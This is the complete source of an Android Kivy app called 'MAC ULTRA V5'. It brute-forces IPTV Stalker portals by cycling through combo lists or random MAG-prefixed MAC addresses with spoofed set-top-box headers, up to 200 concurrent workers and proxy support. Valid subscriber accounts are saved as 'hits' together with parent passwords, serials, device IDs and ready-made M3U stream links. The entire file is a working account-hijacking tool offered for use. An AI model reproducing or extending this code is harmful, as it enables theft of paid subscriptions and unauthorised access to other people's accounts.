import os, asyncio, time, urllib.parse, httpx, random, ssl, json, socket, uuid
from datetime import datetime
from threading import Thread
from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.spinner import Spinner
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.slider import Slider
from kivy.uix.progressbar import ProgressBar
from kivy.uix.image import Image
from kivy.core.clipboard import Clipboard
from kivy.graphics import Color, RoundedRectangle
from kivy.uix.screenmanager import ScreenManager, Screen

# --- ANDROID NATIVE AUDIO ---
try:
    from jnius import autoclass
    MediaPlayer = autoclass('android.media.MediaPlayer')
    mPlayer = MediaPlayer()
    HAS_JNIUS = True
except:
    HAS_JNIUS = False

# --- FARBEN & PFADE ---
BG_DARK = (0.01, 0.02, 0.04, 1)
CARD_COLOR = (0.05, 0.07, 0.12, 1)
CYAN, GREEN, RED, YELLOW, WHITE = (0, 0.9, 1, 1), (0, 1, 0.5, 1), (1, 0.2, 0.2, 1), (1, 0.8, 0, 1), (1, 1, 1, 1)
FAV_FILE = "/storage/emulated/0/Portals/favoriten_liste.json"
MUSIC_PATH = "/storage/emulated/0/MAC-ULTRA-Assets/music.mp3"

# --- ORIGINAL STYLED COMPONENTS ---
class StyledCard(BoxLayout):
    def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
        super().__init__(**kwargs)
        with self.canvas.before:
            Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *a): self.rect.pos, self.rect.size = self.pos, self.size

class StyledButton(Button):
    def __init__(self, bg_color=CARD_COLOR, radius=[10,], **kwargs):
        super().__init__(**kwargs)
        self.background_normal, self.background_color = "", (0,0,0,0)
        with self.canvas.before:
            self.bg_color_inst = Color(*bg_color)
            self.rect = RoundedRectangle(pos=self.pos, size=self.size, radius=radius)
        self.bind(pos=self.update_rect, size=self.update_rect)
    def update_rect(self, *a): self.rect.pos, self.rect.size = self.pos, self.size

# --- ORIGINAL PORTAL MANAGER (FAVORITEN) ---
class PortalManagerScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.layout = BoxLayout(orientation="vertical", padding=20, spacing=15)
        self.layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=80, font_size="24sp"))
        
        input_box = BoxLayout(size_hint_y=None, height=120, orientation="vertical", spacing=5)
        self.url_input = TextInput(hint_text="http://url.com:8080", multiline=False, background_color=(0.1, 0.1, 0.1, 1), foreground_color=WHITE)
        row = BoxLayout(spacing=10)
        self.type_spinner = Spinner(text="MAC PORTAL", values=("MAC PORTAL", "M3U PORTAL"))
        add_btn = Button(text="HINZUFÜGEN", background_color=(0, 0.5, 0.2, 1), on_press=self.add_portal)
        row.add_widget(self.type_spinner); row.add_widget(add_btn)
        input_box.add_widget(self.url_input); input_box.add_widget(row)
        self.layout.add_widget(input_box)

        header = BoxLayout(size_hint_y=None, height=40)
        header.add_widget(Label(text="MAC LISTE", color=YELLOW)); header.add_widget(Label(text="M3U LISTE", color=CYAN))
        self.layout.add_widget(header)

        lists = BoxLayout(spacing=10)
        self.mac_list = GridLayout(cols=1, spacing=5, size_hint_y=None); self.mac_list.bind(minimum_height=self.mac_list.setter('height'))
        self.m3u_list = GridLayout(cols=1, spacing=5, size_hint_y=None); self.m3u_list.bind(minimum_height=self.m3u_list.setter('height'))
        s1 = ScrollView(); s1.add_widget(self.mac_list); s2 = ScrollView(); s2.add_widget(self.m3u_list)
        lists.add_widget(s1); lists.add_widget(s2)
        self.layout.add_widget(lists)

        self.layout.add_widget(Button(text="ZURÜCK ZUM SCANNER", size_hint_y=None, height=80, on_press=self.go_back))
        self.add_widget(self.layout)

    def on_enter(self): self.load_favs()
    def load_favs(self):
        self.mac_list.clear_widgets(); self.m3u_list.clear_widgets()
        if not os.path.exists(FAV_FILE): return
        try:
            with open(FAV_FILE, 'r') as f: data = json.load(f)
            for url in data.get("mac", []): self.add_row(self.mac_list, url, "mac")
            for url in data.get("m3u", []): self.add_row(self.m3u_list, url, "m3u")
        except: pass

    def add_row(self, target, url, ptype):
        row = BoxLayout(size_hint_y=None, height=45, spacing=5)
        btn = Button(text=url[:25], font_size="11sp"); btn.bind(on_press=lambda x: self.select(url))
        del_btn = Button(text="X", size_hint_x=0.2, background_color=(0.7,0,0,1)); del_btn.bind(on_press=lambda x: self.delete(url, ptype))
        row.add_widget(btn); row.add_widget(del_btn); target.add_widget(row)

    def select(self, url): self.manager.get_screen('main').portal_input.text = url; self.manager.current = 'main'
    def add_portal(self, *a):
        url = self.url_input.text.strip()
        if not url: return
        ptype = "mac" if "MAC" in self.type_spinner.text else "m3u"
        data = {"mac":[], "m3u":[]}
        if os.path.exists(FAV_FILE):
            with open(FAV_FILE, 'r') as f: data = json.load(f)
        if url not in data[ptype]: data[ptype].append(url)
        with open(FAV_FILE, 'w') as f: json.dump(data, f)
        self.load_favs()

    def delete(self, url, ptype):
        with open(FAV_FILE, 'r') as f: data = json.load(f)
        if url in data[ptype]: data[ptype].remove(url)
        with open(FAV_FILE, 'w') as f: json.dump(data, f)
        self.load_favs()

    def go_back(self, *a): self.manager.current = 'main'

# --- HAUPT SCREEN (REMOTE GUI ORIGINAL) ---
class MagUltraScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.running = False
        self.hits = 0
        self.checked = 0
        self.request_count = 0
        self.error_streak = 0
        self.start_time = time.time()
        self.hit_list = []
        self.setup_ui()

    def setup_ui(self):
        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        self.layout.add_widget(Image(source='/storage/emulated/0/mac-ultra.png', size_hint_y=None, height=250))
        
        # Stats
        stats = GridLayout(cols=3, size_hint_y=None, height=100, spacing=10)
        self.cpm_label = self.create_stat(stats, "CPM", "0", YELLOW)
        self.status_code_label = self.create_stat(stats, "STATUS", "READY", CYAN)
        self.hit_count_label = self.create_stat(stats, "HITS", "0", GREEN)
        self.layout.add_widget(stats)

        # Inputs
        self.portal_input = TextInput(text="http://", multiline=False, size_hint_y=None, height=60)
        self.layout.add_widget(self.portal_input)

        row1 = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.portal_file_spinner = Spinner(text="USE SINGLE", values=self.load_list("/storage/emulated/0/Portals/"))
        self.country_input = TextInput(text="DE", size_hint_x=0.3)
        row1.add_widget(self.portal_file_spinner); row1.add_widget(self.country_input)
        self.layout.add_widget(row1)

        row2 = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.scan_mode = Spinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN"))
        self.combo_spinner = Spinner(text="SELECT COMBO", values=self.load_list("/sdcard/Combo/"))
        row2.add_widget(self.scan_mode); row2.add_widget(self.combo_spinner)
        self.layout.add_widget(row2)

        # Proxy & Delay & Musik
        row3 = BoxLayout(size_hint_y=None, height=60, spacing=10)
        self.proxy_spinner = Spinner(text="NO PROXY", values=("NO PROXY", "HTTP", "SOCKS5"))
        self.delay_input = TextInput(text="0.5", size_hint_x=0.3, hint_text="Delay")
        self.music_btn = Button(text="🎵", size_hint_x=0.2, on_press=self.toggle_music)
        row3.add_widget(self.proxy_spinner); row3.add_widget(self.delay_input); row3.add_widget(self.music_btn)
        self.layout.add_widget(row3)

        # Bots
        bot_box = BoxLayout(size_hint_y=None, height=50)
        self.bot_label = Label(text="BOTS: 50", size_hint_x=0.3)
        self.bot_slider = Slider(min=1, max=200, value=50, step=1)
        self.bot_slider.bind(value=lambda i, v: setattr(self.bot_label, 'text', f"BOTS: {int(v)}"))
        bot_box.add_widget(self.bot_label); bot_box.add_widget(self.bot_slider)
        self.layout.add_widget(bot_box)

        # Log
        self.log_scroll = ScrollView()
        self.log_label = Label(text="Ready...", markup=True, size_hint_y=None, halign='left')
        self.log_label.bind(size=self.log_label.setter('text_size'))
        self.log_scroll.add_widget(self.log_label)
        self.layout.add_widget(self.log_scroll)

        self.pbar = ProgressBar(max=100, size_hint_y=None, height=15)
        self.layout.add_widget(self.pbar)

        # Buttons
        btns = BoxLayout(size_hint_y=None, height=80, spacing=10)
        self.start_btn = Button(text="START SCAN", background_color=(0, 0.6, 0.3, 1), on_press=self.toggle)
        self.fav_btn = Button(text="FAVORITEN", size_hint_x=0.4, on_press=lambda x: setattr(self.manager, 'current', 'portals'))
        btns.add_widget(self.start_btn); btns.add_widget(self.fav_btn)
        self.layout.add_widget(btns)

        self.add_widget(self.layout)

    def create_stat(self, p, t, v, c):
        box = BoxLayout(orientation='vertical')
        box.add_widget(Label(text=t, font_size="11sp"))
        lbl = Label(text=v, font_size="18sp", bold=True, color=c)
        box.add_widget(lbl); p.add_widget(box); return lbl

    # --- ENGINE LOGIC ---
    def get_clean_time(self, raw):
        raw_str = str(raw).strip()
        if not raw_str or raw_str.lower() in ["none", "false", "0", "null"]: return "Unlimited", "Unlimited"
        try:
            if raw_str.isdigit() and len(raw_str) >= 9:
                dt = datetime.fromtimestamp(int(raw_str))
            else:
                for fmt in ("%Y-%m-%d", "%d.%m.%Y"):
                    try: dt = datetime.strptime(raw_str, fmt); break
                    except: continue
            days = (dt - datetime.now()).days
            return dt.strftime('%d.%m.%Y'), f"{max(0, days)} Tage"
        except: return "Unlimited", "Unlimited"

    async def smart_sleep(self):
        self.request_count += 1
        if self.request_count >= 50:
            self.update_log_safe("[color=FFFF00][SYSTEM][/color] 15s Sicherheits-Pause...")
            await asyncio.sleep(15); self.request_count = 0
        await asyncio.sleep(float(self.delay_input.text or 0.1))

    # --- ORIGINAL GROSSE SAVE_HIT BOX ---
    def save_hit(self, portal, portal_ip, server_h, id_val, exp, days, pw, live, movies, series, sn, dev_id, l_list, m_list, s_list, tz_val, active_conn, max_conn, is_m3u=False, cre_date="N/A"):
        domain = portal.split('//')[-1].split(':')[0]
        final_dir = "/storage/emulated/0/Hits/MAC-ULTRA-V5/"
        os.makedirs(final_dir, exist_ok=True)
        
        box = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ 𝗠𝗔𝗖 𝗨𝗟𝗧𝗥𝗔 𝗩𝟱 𝗛𝗜𝗧
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗣𝗼𝗿𝘁𝗮𝗹   : {portal}
  🌐 𝗜𝗣       : {portal_ip}
  🖥️ 𝗦𝗲𝗿𝘃𝗲𝗿   : {server_h}
  👤 {'𝗠𝟯𝗨 𝗨𝘀𝗲𝗿' if is_m3u else '𝗠𝗔𝗖'}    : {id_val}
  🔐 {'𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱' if is_m3u else '𝗔𝗱𝘂𝗹𝘁'} : {pw}
  📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱  : {cre_date}
  📅 𝗘𝘅𝗽𝗶𝗿𝘆   : {exp} (⌛ {days})
  🧱 𝗦𝗡        : {sn}
  📲 𝗗𝗲𝘃 𝗜𝗗   : {dev_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗞𝗘𝗡:
  🎬 Filme    : {movies}
  🎞️ Serien   : {series}
  📡 Live TV  : {live}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛸 𝗔𝗰𝘁𝗶𝘃𝗲     : {active_conn}
  🛸 𝗠𝗮𝘅 𝗖𝗼𝗻𝗻. : {max_conn}
  🛸 𝗭𝗼𝗻𝗲       : {tz_val}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🔗 𝗠𝟯𝗨 𝗟𝗜𝗡𝗞:
  {portal}/get.php?username={id_val}&password={pw}&type=m3u_plus&output=ts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🛰️ MAC ULTRA Scan: {time.strftime('%H:%M / %d.%m.%Y')}
"""
        if l_list: box += f" 📂 𝗟𝗜𝗩𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {l_list} ❳\n\n"
        if m_list: box += f" 🎬 𝗠𝗢𝗩𝗜𝗘 𝗟𝗜𝗦𝗧\n ╚┈❲ {m_list} ❳\n\n"
        if s_list: box += f" 🎞️ 𝗦𝗘𝗥𝗜𝗘𝗦 𝗟𝗜𝗦𝗧\n ╚┈❲ {s_list} ❳\n\n"
        
        with open(os.path.join(final_dir, f"{domain}.txt"), "a", encoding="utf-8") as f:
            f.write(box + "\n")

    async def process_check(self, mac, portal, client):
        try:
            await self.smart_sleep()
            geo = {'DE': '85.10.1.1', 'IT': '151.1.1.1'}.get(self.country_input.text.upper(), '1.1.1.1')
            headers = {
                'User-Agent': 'MAG254',
                'X-Forwarded-For': geo,
                'Cookie': f'mac={urllib.parse.quote(mac)}; language=en; timezone=Europe/Berlin;',
                'Accept': '*/*',
                'Referer': f'{portal}/c/',
                'X-User-Agent': 'Model: MAG254; Link: Ethernet',
                'JsHttpRequest': '1-xml'
            }

            # Handshake
            r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=headers)
            self.last_status = str(r.status_code)
            
            if r.status_code == 200 and 'token' in r.text:
                js_data = r.json().get('js', {})
                token = js_data.get('token')
                headers['Authorization'] = f'Bearer {token}'
                
                # Info
                ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=headers)
                if ri.status_code == 200:
                    js = ri.json().get('js', {})
                    exp, days = self.get_clean_time(js.get('end_date'))
                    cre, _ = self.get_clean_time(js.get('reg_date'))
                    
                    self.hits += 1
                    self.save_hit(
                        portal, "Detected", "STB-Server", mac, exp, days, 
                        js.get('parent_password', '0000'), "N/A", "N/A", "N/A",
                        js.get('sn', 'N/A'), js.get('device_id', 'N/A'),
                        "", "", "", js.get('timezone', 'UTC'), "0", "1", False, cre
                    )
                    self.update_log_safe(f"[color=00FF80][HIT][/color] {mac} | {days}")
        except: pass

    async def engine(self):
        portal = self.portal_input.text.strip().rstrip('/')
        if self.scan_mode.text == "COMBO FILE":
            with open(f"/sdcard/Combo/{self.combo_spinner.text}", 'r', errors='ignore') as f:
                combo = [l.strip() for l in f if l.strip()]
        else:
            combo = [f"00:1A:79:{':'.join([f'{random.randint(0,255):02x}' for _ in range(3)])}" for _ in range(1000)]

        self.total_lines, self.checked, self.hits, self.start_time = len(combo), 0, 0, time.time()
        Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))

        self.update_log_safe(f"[color=00FFFF][INFO][/color] Server: {portal} [OK]")

        queue = asyncio.Queue()
        for l in combo: queue.put_nowait(l)

        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            workers = [self.worker(queue, portal, client) for _ in range(int(self.bot_slider.value))]
            await asyncio.gather(*workers)

        self.running = False
        Clock.schedule_once(lambda dt: setattr(self.start_btn, 'text', "START SCAN"))

    async def worker(self, queue, portal, client):
        while self.running and not queue.empty():
            mac = await queue.get()
            await self.process_check(mac, portal, client)
            self.checked += 1
            Clock.schedule_once(lambda dt: self.refresh_ui())
            queue.task_done()

    def toggle(self, *a):
        if not self.running:
            self.running, self.start_btn.text = True, "STOP SCAN"
            Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
        else: self.running = False

    def toggle_music(self, *a):
        if not HAS_JNIUS: return
        try:
            if mPlayer.isPlaying(): mPlayer.pause()
            else: mPlayer.setDataSource(MUSIC_PATH); mPlayer.prepare(); mPlayer.start()
        except: pass

    def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
    def _do_log(self, t):
        self.hit_list.append(t)
        if len(self.hit_list) > 10: self.hit_list.pop(0)
        self.log_label.text = "\n".join(self.hit_list)

    def refresh_ui(self, *a):
        self.pbar.value, self.hit_count_label.text = self.checked, str(self.hits)
        self.status_code_label.text = getattr(self, 'last_status', 'READY')
        el = time.time() - self.start_time
        if el > 0: self.cpm_label.text = str(int((self.checked / el) * 60))

    def load_list(self, path):
        if not os.path.exists(path): return ["EMPTY"]
        return sorted([f for f in os.listdir(path) if f.endswith(".txt")])

class MagApp(App):
    def build(self):
        sm = ScreenManager()
        sm.add_widget(MagUltraScreen(name='main'))
        sm.add_widget(PortalManagerScreen(name='portals'))
        return sm

if __name__ == "__main__": MagApp().run()
